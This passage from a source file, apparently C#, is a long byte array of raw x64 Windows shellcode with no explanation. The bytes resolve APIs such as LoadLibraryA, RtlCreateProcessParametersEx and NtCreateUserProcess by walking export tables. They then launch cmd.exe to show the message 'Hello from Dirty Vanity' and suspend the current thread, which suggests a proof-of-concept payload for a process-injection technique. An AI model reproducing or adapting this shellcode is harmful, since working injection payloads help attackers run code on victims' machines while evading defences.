        0x48, 0x8B, 0x8D, 0x98, 0x01, 0x00, 0x00, 0x48, 0x03, 0xC8,
        0x48, 0x8B, 0xC1, 0x48, 0x89, 0x85, 0xB0, 0x01, 0x00, 0x00,
        0x48, 0xB8, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x41,
        0x48, 0x89, 0x45, 0x10, 0xC7, 0x85, 0xB8, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x48, 0x63, 0x85, 0xB8, 0x01, 0x00,
        0x00, 0x48, 0x8B, 0x8D, 0xB0, 0x01, 0x00, 0x00, 0x48, 0x63,
        0x04, 0x81, 0x48, 0x8B, 0x8D, 0x98, 0x01, 0x00, 0x00, 0x48,
        0x8B, 0x55, 0x10, 0x48, 0x39, 0x14, 0x01, 0x74, 0x10, 0x8B,
        0x85, 0xB8, 0x01, 0x00, 0x00, 0xFF, 0xC0, 0x89, 0x85, 0xB8,
        0x01, 0x00, 0x00, 0xEB, 0xCD, 0x48, 0x8B, 0x85, 0xA8, 0x01,
        0x00, 0x00, 0x8B, 0x40, 0x24, 0x48, 0x8B, 0x8D, 0x98, 0x01,
        0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89,
        0x85, 0xC0, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0xA8, 0x01,
        0x00, 0x00, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x8D, 0x98, 0x01,
        0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89,
        0x85, 0xC8, 0x01, 0x00, 0x00, 0x48, 0x63, 0x85, 0xB8, 0x01,
        0x00, 0x00, 0x48, 0x8B, 0x8D, 0xC0, 0x01, 0x00, 0x00, 0x48,
        0x0F, 0xBF, 0x04, 0x41, 0x48, 0x8B, 0x8D, 0xC8, 0x01, 0x00,
        0x00, 0x48, 0x63, 0x04, 0x81, 0x48, 0x8B, 0x8D, 0x98, 0x01,
        0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89,
        0x85, 0xD0, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x98, 0x01,
        0x00, 0x00, 0x48, 0x89, 0x85, 0xD8, 0x01, 0x00, 0x00, 0x48,
        0x8B, 0x85, 0x78, 0x01, 0x00, 0x00, 0x48, 0x89, 0x85, 0xE0,
        0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0xE0, 0x01, 0x00, 0x00,
        0xC7, 0x80, 0x14, 0x01, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF,
        0x48, 0x8B, 0x85, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x40,
        0x30, 0x48, 0x89, 0x85, 0xE8, 0x01, 0x00, 0x00, 0x48, 0xB8,
        0x4C, 0x6F, 0x61, 0x64, 0x4C, 0x69, 0x62, 0x72, 0x48, 0x89,
        0x45, 0x10, 0x48, 0xC7, 0x45, 0x18, 0x61, 0x72, 0x79, 0x41,
        0x48, 0x8D, 0x55, 0x10, 0x48, 0x8B, 0x8D, 0xD8, 0x01, 0x00,
        0x00, 0xFF, 0x95, 0xD0, 0x01, 0x00, 0x00, 0x48, 0x89, 0x85,
        0xF0, 0x01, 0x00, 0x00, 0x48, 0xB8, 0x52, 0x74, 0x6C, 0x41,
        0x6C, 0x6C, 0x6F, 0x63, 0x48, 0x89, 0x45, 0x10, 0x48, 0xB8,
        0x61, 0x74, 0x65, 0x48, 0x65, 0x61, 0x70, 0x00, 0x48, 0x89,
        0x45, 0x18, 0x48, 0x8D, 0x55, 0x10, 0x48, 0x8B, 0x8D, 0xE8,
        0x01, 0x00, 0x00, 0xFF, 0x95, 0xD0, 0x01, 0x00, 0x00, 0x48,
        0x89, 0x85, 0xF8, 0x01, 0x00, 0x00, 0x48, 0xB8, 0x52, 0x74,
        0x6C, 0x43, 0x72, 0x65, 0x61, 0x74, 0x48, 0x89, 0x45, 0x38,
        0x48, 0xB8, 0x65, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73,
        0x48, 0x89, 0x45, 0x40, 0x48, 0xB8, 0x50, 0x61, 0x72, 0x61,
        0x6D, 0x65, 0x74, 0x65, 0x48, 0x89, 0x45, 0x48, 0x48, 0xC7,
        0x45, 0x50, 0x72, 0x73, 0x45, 0x78, 0x48, 0x8D, 0x55, 0x38,
        0x48, 0x8B, 0x8D, 0xE8, 0x01, 0x00, 0x00, 0xFF, 0x95, 0xD0,
        0x01, 0x00, 0x00, 0x48, 0x89, 0x85, 0x00, 0x02, 0x00, 0x00,
        0x48, 0xB8, 0x4E, 0x74, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65,
        0x48, 0x89, 0x45, 0x20, 0x48, 0xB8, 0x55, 0x73, 0x65, 0x72,
        0x50, 0x72, 0x6F, 0x63, 0x48, 0x89, 0x45, 0x28, 0x48, 0xC7,
        0x45, 0x30, 0x65, 0x73, 0x73, 0x00, 0x48, 0x8D, 0x55, 0x20,
        0x48, 0x8B, 0x8D, 0xE8, 0x01, 0x00, 0x00, 0xFF, 0x95, 0xD0,
        0x01, 0x00, 0x00, 0x48, 0x89, 0x85, 0x08, 0x02, 0x00, 0x00,
        0x48, 0xB8, 0x52, 0x74, 0x6C, 0x49, 0x6E, 0x69, 0x74, 0x55,
        0x48, 0x89, 0x45, 0x20, 0x48, 0xB8, 0x6E, 0x69, 0x63, 0x6F,
        0x64, 0x65, 0x53, 0x74, 0x48, 0x89, 0x45, 0x28, 0x48, 0xC7,
        0x45, 0x30, 0x72, 0x69, 0x6E, 0x67, 0x48, 0x8D, 0x55, 0x20,
        0x48, 0x8B, 0x8D, 0xE8, 0x01, 0x00, 0x00, 0xFF, 0x95, 0xD0,
        0x01, 0x00, 0x00, 0x48, 0x89, 0x85, 0x10, 0x02, 0x00, 0x00,
        0x48, 0xB8, 0x5C, 0x00, 0x3F, 0x00, 0x3F, 0x00, 0x5C, 0x00,
        0x48, 0x89, 0x45, 0x60, 0x48, 0xB8, 0x43, 0x00, 0x3A, 0x00,
        0x5C, 0x00, 0x57, 0x00, 0x48, 0x89, 0x45, 0x68, 0x48, 0xB8,
        0x69, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x6F, 0x00, 0x48, 0x89,
        0x45, 0x70, 0x48, 0xB8, 0x77, 0x00, 0x73, 0x00, 0x5C, 0x00,
        0x53, 0x00, 0x48, 0x89, 0x45, 0x78, 0x48, 0xB8, 0x79, 0x00,
        0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x48, 0x89, 0x85, 0x80,
        0x00, 0x00, 0x00, 0x48, 0xB8, 0x6D, 0x00, 0x33, 0x00, 0x32,
        0x00, 0x5C, 0x00, 0x48, 0x89, 0x85, 0x88, 0x00, 0x00, 0x00,
        0x48, 0xB8, 0x63, 0x00, 0x6D, 0x00, 0x64, 0x00, 0x2E, 0x00,
        0x48, 0x89, 0x85, 0x90, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x65,
        0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00, 0x48, 0x89, 0x85,
        0x98, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x55, 0x60, 0x48, 0x8D,
        0x8D, 0x18, 0x02, 0x00, 0x00, 0xFF, 0x95, 0x10, 0x02, 0x00,
        0x00, 0x48, 0xB8, 0x5C, 0x00, 0x3F, 0x00, 0x3F, 0x00, 0x5C,
        0x00, 0x48, 0x89, 0x85, 0xA0, 0x00, 0x00, 0x00, 0x48, 0xB8,
        0x43, 0x00, 0x3A, 0x00, 0x5C, 0x00, 0x57, 0x00, 0x48, 0x89,
        0x85, 0xA8, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x69, 0x00, 0x6E,
        0x00, 0x64, 0x00, 0x6F, 0x00, 0x48, 0x89, 0x85, 0xB0, 0x00,
        0x00, 0x00, 0x48, 0xB8, 0x77, 0x00, 0x73, 0x00, 0x5C, 0x00,
        0x53, 0x00, 0x48, 0x89, 0x85, 0xB8, 0x00, 0x00, 0x00, 0x48,
        0xB8, 0x79, 0x00, 0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x48,
        0x89, 0x85, 0xC0, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x6D, 0x00,
        0x33, 0x00, 0x32, 0x00, 0x5C, 0x00, 0x48, 0x89, 0x85, 0xC8,
        0x00, 0x00, 0x00, 0x48, 0xB8, 0x63, 0x00, 0x6D, 0x00, 0x64,
        0x00, 0x2E, 0x00, 0x48, 0x89, 0x85, 0xD0, 0x00, 0x00, 0x00,
        0x48, 0xB8, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x20, 0x00,
        0x48, 0x89, 0x85, 0xD8, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x2F,
        0x00, 0x6B, 0x00, 0x20, 0x00, 0x6D, 0x00, 0x48, 0x89, 0x85,
        0xE0, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x73, 0x00, 0x67, 0x00,
        0x20, 0x00, 0x2A, 0x00, 0x48, 0x89, 0x85, 0xE8, 0x00, 0x00,
        0x00, 0x48, 0xB8, 0x20, 0x00, 0x48, 0x00, 0x65, 0x00, 0x6C,
        0x00, 0x48, 0x89, 0x85, 0xF0, 0x00, 0x00, 0x00, 0x48, 0xB8,
        0x6C, 0x00, 0x6F, 0x00, 0x20, 0x00, 0x66, 0x00, 0x48, 0x89,
        0x85, 0xF8, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x72, 0x00, 0x6F,
        0x00, 0x6D, 0x00, 0x20, 0x00, 0x48, 0x89, 0x85, 0x00, 0x01,
        0x00, 0x00, 0x48, 0xB8, 0x44, 0x00, 0x69, 0x00, 0x72, 0x00,
        0x74, 0x00, 0x48, 0x89, 0x85, 0x08, 0x01, 0x00, 0x00, 0x48,
        0xB8, 0x79, 0x00, 0x20, 0x00, 0x56, 0x00, 0x61, 0x00, 0x48,
        0x89, 0x85, 0x10, 0x01, 0x00, 0x00, 0x48, 0xB8, 0x6E, 0x00,
        0x69, 0x00, 0x74, 0x00, 0x79, 0x00, 0x48, 0x89, 0x85, 0x18,
        0x01, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x20, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x95, 0xA0, 0x00, 0x00,
        0x00, 0x48, 0x8D, 0x8D, 0x28, 0x02, 0x00, 0x00, 0xFF, 0x95,
        0x10, 0x02, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x38, 0x02, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x50, 0x01,
        0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x48, 0x00, 0x00,
        0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x40, 0x00, 0x00, 0x00,
        0x00, 0x48, 0xC7, 0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00,
        0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x48,
        0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D,
        0x85, 0x28, 0x02, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20,
        0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x48, 0x8D, 0x95, 0x18,
        0x02, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x38, 0x02, 0x00, 0x00,
        0xFF, 0x95, 0x00, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x85, 0x40,
        0x02, 0x00, 0x00, 0x48, 0x8B, 0xF8, 0x33, 0xC0, 0xB9, 0x58,
        0x00, 0x00, 0x00, 0xF3, 0xAA, 0x48, 0xC7, 0x85, 0x40, 0x02,
        0x00, 0x00, 0x58, 0x00, 0x00, 0x00, 0xC7, 0x85, 0x48, 0x02,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB8, 0x08, 0x00, 0x00,
        0x00, 0x48, 0x6B, 0xC0, 0x01, 0x41, 0xB8, 0x20, 0x00, 0x00,
        0x00, 0xBA, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4D, 0x00,
        0x48, 0x8B, 0x4C, 0x01, 0x28, 0xFF, 0x95, 0xF8, 0x01, 0x00,
        0x00, 0x48, 0x89, 0x85, 0xA0, 0x02, 0x00, 0x00, 0x48, 0x8B,
        0x85, 0xA0, 0x02, 0x00, 0x00, 0x48, 0xC7, 0x00, 0x28, 0x00,
        0x00, 0x00, 0xB8, 0x20, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0,
        0x00, 0x48, 0x8B, 0x8D, 0xA0, 0x02, 0x00, 0x00, 0xC7, 0x44,
        0x01, 0x08, 0x05, 0x00, 0x02, 0x00, 0xB8, 0x20, 0x00, 0x00,
        0x00, 0x48, 0x6B, 0xC0, 0x00, 0x0F, 0xB7, 0x8D, 0x18, 0x02,
        0x00, 0x00, 0x48, 0x8B, 0x95, 0xA0, 0x02, 0x00, 0x00, 0x48,
        0x89, 0x4C, 0x02, 0x10, 0xB8, 0x20, 0x00, 0x00, 0x00, 0x48,
        0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x8D, 0xA0, 0x02, 0x00, 0x00,
        0x48, 0x8B, 0x95, 0x20, 0x02, 0x00, 0x00, 0x48, 0x89, 0x54,
        0x01, 0x18, 0x48, 0xC7, 0x85, 0xB0, 0x02, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8B, 0x85, 0xA0, 0x02, 0x00, 0x00,
        0x48, 0x89, 0x44, 0x24, 0x50, 0x48, 0x8D, 0x85, 0x40, 0x02,
        0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x8B, 0x85,
        0x38, 0x02, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x40, 0xC7,
        0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24,
        0x30, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x28,
        0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00,
        0x00, 0x00, 0x00, 0x41, 0xB9, 0xFF, 0xFF, 0x1F, 0x00, 0x41,
        0xB8, 0xFF, 0xFF, 0x1F, 0x00, 0x48, 0x8D, 0x95, 0xB0, 0x02,
        0x00, 0x00, 0x48, 0x8D, 0x8D, 0xA8, 0x02, 0x00, 0x00, 0xFF,
        0x95, 0x08, 0x02, 0x00, 0x00, 0x89, 0x85, 0xB8, 0x02, 0x00,
        0x00, 0x48, 0xB8, 0x4E, 0x74, 0x53, 0x75, 0x73, 0x70, 0x65,
        0x6E, 0x48, 0x89, 0x45, 0x10, 0x48, 0xB8, 0x64, 0x54, 0x68,
        0x72, 0x65, 0x61, 0x64, 0x00, 0x48, 0x89, 0x45, 0x18, 0x48,
        0x8D, 0x55, 0x10, 0x48, 0x8B, 0x8D, 0xE8, 0x01, 0x00, 0x00,
        0xFF, 0x95, 0xD0, 0x01, 0x00, 0x00, 0x48, 0x89, 0x85, 0xC0,
        0x02, 0x00, 0x00, 0x33, 0xD2, 0x48, 0xC7, 0xC1, 0xFE, 0xFF,
        0xFF, 0xFF, 0xFF, 0x95, 0xC0, 0x02, 0x00, 0x00, 0x48, 0x8D,
        0xA5, 0x58, 0x03, 0x00, 0x00, 0x5F, 0x5D, 0xC3 };
    }
}
